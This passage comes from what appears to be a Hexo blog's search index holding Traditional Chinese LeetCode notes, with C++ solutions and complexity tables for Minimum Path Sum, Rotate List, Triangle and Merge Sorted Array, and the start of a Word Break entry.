class="number">0</span>] + grid[i][<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>; j&lt;n;j++)&#123;</span><br><span class="line">        dp[<span class="number">0</span>][j] = dp[<span class="number">0</span>][j<span class="number">-1</span>] + grid[<span class="number">0</span>][j];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt;m; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>; j&lt;n;j++)&#123;</span><br><span class="line">            dp[i][j] = <span class="built_in">min</span>(dp[i<span class="number">-1</span>][j], dp[i][j<span class="number">-1</span>]) + grid[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[m<span class="number">-1</span>][n<span class="number">-1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其實就上面講的一樣，每一格的最短路徑是由其上方或左邊那格的最短路徑加上當前 <code>grid</code> 值所得到的。而對於做左側那行中的每一格只會來自他的上面，而對於在最下面那列的所有格中，只會來自於他的左側，因此透過兩個迴圈來處理這兩種狀況，最後就是透過雙重迴圈來去迭代每一個進行短路徑的加總。</p><h3 id="執行結果-1"><a href="#執行結果-1" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/64/result2.jpeg"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><table><thead><tr><th>方法</th><th>時間複雜度</th><th>分析過程</th></tr></thead><tbody><tr><td>Recursion + Memoization</td><td>$O(m \times n)$</td><td>遞迴計算每個格子的最小路徑和，且利用 <code>dp</code> 紀錄已計算的結果，避免重複計算</td></tr><tr><td>Iteration</td><td>$O(m \times n)$</td><td>透過雙重迴圈逐格計算，直接更新 <code>dp</code> 表格，效率與遞迴類似，但避免了函式調用的開銷</td></tr></tbody></table><table><thead><tr><th>方法</th><th>空間複雜度</th><th>分析過程</th></tr></thead><tbody><tr><td>Recursion + Memoization</td><td>$O(m \times n)$</td><td><code>dp</code> 表格需要儲存所有格子的最小路徑和，同時遞迴呼叫需要額外的函式呼叫堆疊，最多深度為 $O(m + n)$</td></tr><tr><td>Iteration</td><td>$O(m \times n)$</td><td>使用 <code>dp</code> 表格來儲存最小路徑和，但沒有遞迴，因此沒有額外的呼叫堆疊空間</td></tr></tbody></table><hr>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> Dynamic Programming </tag>
            
            <tag> Multidimensional DP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>旋轉鏈結串列 | Medium | LeetCode#61. Rotate List</title>
      <link href="/posts/ea1b4e6c.html"/>
      <url>/posts/ea1b4e6c.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/61/question.jpeg"></p><ul><li>題目難度：<code>Medium</code></li><li>題目描述： 給定一個 Linked List 的 <code>head</code>，選轉整個 List <code>k</code> 次後回傳新的List head</li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><blockquote><p>看題目給的範例測資，可以知道所謂旋轉就是尾端的 node 插入到 List 前端作為新的 head，而這個操作要進行 <code>k</code> 次，一開始的想法就是很直觀， <strong>找到尾端節點，插入到首端，然後遞迴操作</strong></p></blockquote><h2 id="先前的解法"><a href="#先前的解法" class="headerlink" title="先前的解法"></a>先前的解法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode() : val(0), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x, ListNode *next) : val(x), next(next) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">rotateRight</span><span class="params">(ListNode* head, <span class="type">int</span> k)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(head == <span class="literal">nullptr</span>) <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="keyword">if</span>(!head || !head-&gt;next || k==<span class="number">0</span>) <span class="keyword">return</span> head; </span><br><span class="line"></span><br><span class="line">        <span class="comment">//find the last node of the list</span></span><br><span class="line">        ListNode *last = head;</span><br><span class="line">        ListNode *prev = <span class="keyword">new</span> <span class="built_in">ListNode</span>();</span><br><span class="line">        prev-&gt;next = last;</span><br><span class="line">        ListNode *front = head;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span>(last-&gt;next!=<span class="literal">nullptr</span>)&#123;</span><br><span class="line">            last = last-&gt;next;</span><br><span class="line">            prev = prev-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        last-&gt;next =head;</span><br><span class="line">        prev-&gt;next = <span class="literal">nullptr</span>;</span><br><span class="line">        prev = <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="keyword">delete</span> prev;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">rotateRight</span>(last, k<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>這裡的想法就是先宣告兩個指標 <code>last</code> 跟 <code>prev</code>，<code>last</code> 用於指向Linked List 的最後一個節點，而 <code>prev</code> 用於紀錄 <code>last</code> 的前一個元素，也就代表新的尾端元素。接著就將 <code>last</code> 指向到 <code>head</code>，然後由於 <code>prev</code> 會是新的末端節點，因此需要指向 <code>nullptr</code>，然後就遞迴呼叫 <code>rotateRight</code> 本身，最後一旦 <code>k</code> 減為0，就回傳新的 <code>head</code>。</p><blockquote><p><strong>這種做法會導致每一次的遞迴呼叫都會建立 <code>prev</code> 節點，會大量消耗記憶體，出現 Memory Limit Exceeded</strong></p></blockquote><h2 id="更好的做法"><a href="#更好的做法" class="headerlink" title="更好的做法"></a>更好的做法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode() : val(0), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x, ListNode *next) : val(x), next(next) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">rotateRight</span><span class="params">(ListNode* head, <span class="type">int</span> k)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(head == <span class="literal">nullptr</span>) <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="keyword">if</span>(!head || !head-&gt;next || k==<span class="number">0</span>) <span class="keyword">return</span> head; </span><br><span class="line"></span><br><span class="line">        <span class="comment">//find the last node of the list</span></span><br><span class="line">        ListNode *last = head;</span><br><span class="line">        <span class="type">int</span> length = <span class="number">1</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span>(last-&gt;next!=<span class="literal">nullptr</span>)&#123;</span><br><span class="line">            last = last-&gt;next;</span><br><span class="line">            length++;</span><br><span class="line">        &#125;</span><br><span class="line">        last-&gt;next = head;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//Find new head positions</span></span><br><span class="line">        k = k % length;</span><br><span class="line">        <span class="type">int</span> countToNewHead = length - k;</span><br><span class="line">        ListNode* newTail = head;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt;countToNewHead; i++)&#123;</span><br><span class="line">            newTail = newTail -&gt; next; </span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        ListNode *newHead = newTail-&gt; next;</span><br><span class="line">        newTail-&gt;next = <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="keyword">return</span> newHead;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>這裡改用 Iteration 的方式來實作，首先原先的 <code>last</code> 在迭代的時候同時也紀錄 list 的長度，接著將 <code>last</code> 指向 <code>head</code> 作為新的 <code>head</code>。 <code>k</code> 代表要選轉多少次，但這個數字可能會遠大於 linked list 長度 <code>length</code>，所以可以透過 <code>k % length</code> 來先找到最終的 <code>head</code> 會輪到哪個節點。</p><p>知道是哪個節點後，還需要知道從該節點 走到該節點走到末端節點要走幾步，所以透過 <code>length - k</code> 來得到 <code>countToNewHead</code>，之後定義一個新的 <code>newTail</code> 來獲取當前 Linked List 的倒數第二個節點，這樣他的 <code>next</code> 就會是新的head <code>newHead</code>，之後將 <code>newTail</code> 指向到 <code>nullptr</code> 斷開環形結構後就可以直接回傳 <code>newHead</code> 了。</p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/61/result.jpeg"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><table><thead><tr><th>方法</th><th>時間複雜度</th><th>分析簡述</th></tr></thead><tbody><tr><td>Recursion</td><td>$O(k \times n)$</td><td>每次遞歸都會遍歷整個鏈表找到最後一個節點，總共執行 $k$ 次，因此時間複雜度為 $O(k \times n)$</td></tr><tr><td>Iteration</td><td>$O(n)$</td><td>計算鏈表長度需遍歷一次，再執行一次遍歷找到新頭節點，因此總共遍歷 2 次，時間複雜度為 $O(n)$</td></tr></tbody></table><h2 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h2><table><thead><tr><th>方法</th><th>空間複雜度</th><th>分析簡述</th></tr></thead><tbody><tr><td>Recursion</td><td>$O(k)$</td><td>每次遞歸會佔用棧空間，深度為 $k$，因此空間複雜度為 $O(k)$</td></tr><tr><td>Iteration</td><td>$O(1)$</td><td>僅使用少量指針變數進行操作，不需要額外的空間，空間複雜度為 $O(1)$</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> Linked List </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>三角形 | Medium | LeetCode#120. Triangle</title>
      <link href="/posts/cd4d1860.html"/>
      <url>/posts/cd4d1860.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/120/question.jpeg"></p><ul><li>題目難度: <code>Medium</code></li><li>題目敘述: 題目給定一個2D陣列 <code>triangle</code>，求從最頂端走到最底端的最小路徑總和值</li></ul><div class="note info flat"><p>對於每個 row 只能往下一層走，並且每次都會有兩種走法，假設現在在當前row的位置是 <code>i</code>，則下一層能夠選擇繼續走到 <code>i</code> 或者是 <code>i+1</code> 的位置。</p></div><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">範例:</span><br><span class="line">   2</span><br><span class="line">  3 4</span><br><span class="line"> 6 5 7</span><br><span class="line">4 1 8 3</span><br><span class="line">最短路徑總和會是: 2 + 3 + 5 + 1 = 11</span><br></pre></td></tr></table></figure><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>想法其實也還蠻單純的，<strong>就是每層都可以有選或不選特定路徑</strong>，由於要找最短的路徑和， <strong>因此需要兩條路徑都選擇，比較回傳結果大小</strong> ，然後選小的回傳，這樣整體遞迴呼叫完畢後就能夠求出最短路徑和。</p><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><h3 id="Recursive"><a href="#Recursive" class="headerlink" title="Recursive"></a>Recursive</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">helper</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; triangle, <span class="type">int</span> row, <span class="type">int</span> index ,<span class="type">int</span> result )</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(row == triangle.<span class="built_in">size</span>())&#123;</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// boundary conditions</span></span><br><span class="line">        <span class="type">int</span> r1 = <span class="built_in">helper</span>(triangle, row+<span class="number">1</span>, index, result+triangle[row][index]);</span><br><span class="line">        <span class="keyword">if</span>(index+<span class="number">1</span> &lt; triangle[row].<span class="built_in">size</span>())&#123;</span><br><span class="line">            <span class="type">int</span> r2 = <span class="built_in">helper</span>(triangle, row+<span class="number">1</span>, index+<span class="number">1</span>, result+triangle[row][index+<span class="number">1</span>]); </span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">min</span>(r1,r2);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> r1; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minimumTotal</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; triangle)</span></span>&#123;</span><br><span class="line">        <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">        result += triangle[<span class="number">0</span>][<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">helper</span>(triangle, <span class="number">1</span>, <span class="number">0</span>, result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>這是初次找出遞迴關係後的版本，首先在 <code>minimumTotal</code>中會初始化一個用於儲存路徑和的變數 <code>result</code>，由於頂端元素必定存在 (題目的限制)，因此可以直接先加入到 <code>result</code>，接著呼叫 <code>helper()</code>，在 <code>helper</code> 函數中， <code>r1</code> 和 <code>r2</code> 分別儲存 <code>helper()</code> 函數遞迴呼叫的結果，接著比較 <code>min(r1,r2)</code> 回傳路徑和比較小的結果。 而遞迴呼叫的停止條件就是當 <code>row</code> 到達最後一層。</p><blockquote><p>但這樣包含了大量的重複計算，會花費大量時間，因此會是 Time Limit Exceeded</p></blockquote><h3 id="Recursive-Memoization"><a href="#Recursive-Memoization" class="headerlink" title="Recursive + Memoization"></a>Recursive + Memoization</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    </span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; dp;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">helper</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; triangle, <span class="type">int</span> row, <span class="type">int</span> index )</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(row == triangle.<span class="built_in">size</span>())&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(dp[row][index]!=INT_MAX) <span class="keyword">return</span> dp[row][index];</span><br><span class="line">        </span><br><span class="line">        <span class="type">int</span> r1 = <span class="built_in">helper</span>(triangle, row+<span class="number">1</span>, index);</span><br><span class="line">        <span class="type">int</span> r2 = <span class="built_in">helper</span>(triangle, row+<span class="number">1</span>, index+<span class="number">1</span>); </span><br><span class="line">        dp[row][index] = triangle[row][index] + <span class="built_in">min</span>(r1, r2);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> dp[row][index];</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minimumTotal</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; triangle)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        dp = vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;(triangle.<span class="built_in">size</span>(), <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(triangle.<span class="built_in">size</span>(), INT_MAX));</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">helper</span>(triangle, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>這裡透過另外一個二維向量 <code>dp</code> 來儲存重複運算的結果，這裡將向量初始化為 <code>INT_MAX</code>，而在 <code>helper</code> 函數中，一旦發現有先前計算過的結果就直接回傳，並且由於已經有用於儲存計算結果的 <code>dp</code>，因此也不需要額外的變數來儲存最短路徑和了 </p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/120/result.jpeg"></p><blockquote><p>但這應該也算是複雜度較高的做法了</p></blockquote><h2 id="其他做法"><a href="#其他做法" class="headerlink" title="其他做法"></a>其他做法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minimumTotal</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt; &gt; &amp;triangle)</span> </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; mini = triangle[triangle.<span class="built_in">size</span>()<span class="number">-1</span>];</span><br><span class="line">        <span class="keyword">for</span> ( <span class="type">int</span> i = triangle.<span class="built_in">size</span>() - <span class="number">2</span>; i&gt;= <span class="number">0</span> ; --i )</span><br><span class="line">            <span class="keyword">for</span> ( <span class="type">int</span> j = <span class="number">0</span>; j &lt; triangle[i].<span class="built_in">size</span>() ; ++ j )</span><br><span class="line">                mini[j] = triangle[i][j] + <span class="built_in">min</span>(mini[j],mini[j+<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">return</span> mini[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="執行結果-1"><a href="#執行結果-1" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/120/result2.jpeg"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><table><thead><tr><th>方法類型</th><th>時間複雜度</th><th>簡略時間複雜度分析</th></tr></thead><tbody><tr><td>Recursive + Memoization</td><td>$O(n^2)$</td><td>每個節點計算一次，三角形總節點數為 $n(n+1)&#x2F;2$</td></tr><tr><td>Iteration（Bottom Up）</td><td>$O(n^2)$</td><td>遍歷所有節點，每層需要處理該層節點數量，總計 $n(n+1)&#x2F;2$</td></tr></tbody></table><table><thead><tr><th>方法類型</th><th>空間複雜度</th><th>簡略空間複雜度分析</th></tr></thead><tbody><tr><td>Recursive + Memoization</td><td>$O(n^2)$</td><td>使用大小為 $n \times n$ 的記憶化表 + 遞迴棧深度為 $O(n)$</td></tr><tr><td>Iteration（Bottom Up）</td><td>$O(n)$</td><td>僅用一個大小為 $n$ 的一維陣列保存當前層與下一層結果</td></tr></tbody></table><hr>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> Dynamic Programming </tag>
            
            <tag> Multidimensional DP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>合併排序陣列 | Easy | LeetCode#88. Merge Sorted Array</title>
      <link href="/posts/5a4ba06f.html"/>
      <url>/posts/5a4ba06f.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/88/question.jpeg"></p><ul><li>題目難度：<code>Easy</code></li><li>題目敘述： 題目給定兩個整數陣列 <code>nums1</code>, <code>nums2</code>，並以 <strong>非遞減的順序排序(non-decreasing order)</strong> ，並且給定整數 <code>m</code> 以及 <code>n</code> 分別代表兩個陣列中有多少元素。 <strong>題目要求合併兩個陣列，並且一樣已非遞增的順序存放</strong>，需要將 <code>nums2</code> 的元素合併到 <code>nums1</code>，而不需用函數返回，<code>nums1</code> 函數的長度會是 <code>m+n</code> 而前 <code>m</code> 的元素會是原先 <code>nums1</code> 中的元素。</li></ul><blockquote><p>可以看上面範例圖中的第一個測資，<code>nums1</code> 中的0會被 <code>nums2</code> 取代掉，並且 <code>m</code> 為3，由於是非遞減排序的陣列，因此0不算是元素之一。</p></blockquote><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>我的想法就是先將 <code>nums2</code> 的部分填補到 <code>nums1</code> 多出來的地方，在去排序</p><h2 id="我的解答"><a href="#我的解答" class="headerlink" title="我的解答"></a>我的解答</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">merge</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums1, <span class="type">int</span> m, vector&lt;<span class="type">int</span>&gt;&amp; nums2, <span class="type">int</span> n)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(nums2.<span class="built_in">size</span>()==<span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">if</span>(m==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt; nums2.<span class="built_in">size</span>(); i++)&#123;</span><br><span class="line">                nums1[i] = nums2[i];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> i=m;</span><br><span class="line">        <span class="type">int</span> j=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(j&lt;n)&#123;</span><br><span class="line">            nums1[i]=nums2[j];</span><br><span class="line">            j++;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">sort</span>(nums1.<span class="built_in">begin</span>(), nums1.<span class="built_in">begin</span>() + m +n);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>如果 <code>nums2</code> 為空，則可以直接回傳，因為答案就會是 <code>nums1</code> 本身。如果 <code>nums1</code> 元素都為0 (<code>m=0</code>)，則需要將<code>nums2</code> 內容全部複製到 <code>nums1</code>。 接著後面透過while迴圈來實現 <strong>將 <code>nums2</code> 元素填補到 <code>nums1</code> 空的地方</strong> 這回事，這裡透過兩個額外變數 <code>i</code> <code>j</code> 來分別保存 <code>nums1</code> 中0元素的起點以及 <code>nums2</code>的起點。迴圈結束後就代表 <code>nums2</code> 元素都添加到 <code>nums1</code> 空的地方了，接著就透過 <code>sort()</code> 進行排序。</p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/88/result.jpeg"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><ul><li><code>nums1</code> 元素全為0的處理狀況會是 $O(n)$, $n$ 為 <code>nums1</code> 長度</li><li>while 迴圈 <code>nums2</code> 將 <code>nums1</code> 插入陣列尾端，會進行 <code>n</code> 次操作，因此是 $O(n)$</li><li><code>sort()</code> 會將 <code>nums1</code> 中的前 $m+n$ 個元素進行排序，因此複雜度會是 $O(m+n)log(m+n)$</li></ul><p>整體時間複雜度會是 $O((m+n)log(m+n))$</p><h2 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h2><p>$O(1)$ 額外變數都是使用常數空間</p><hr>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Array </tag>
            
            <tag> LeetCode </tag>
            
            <tag> Easy </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>拆分字句 | Medium | LeetCode#139. Word Break</title>
      <link href="/posts/9081d01d.html"/>
      <url>/posts/9081d01d.html</url>
      
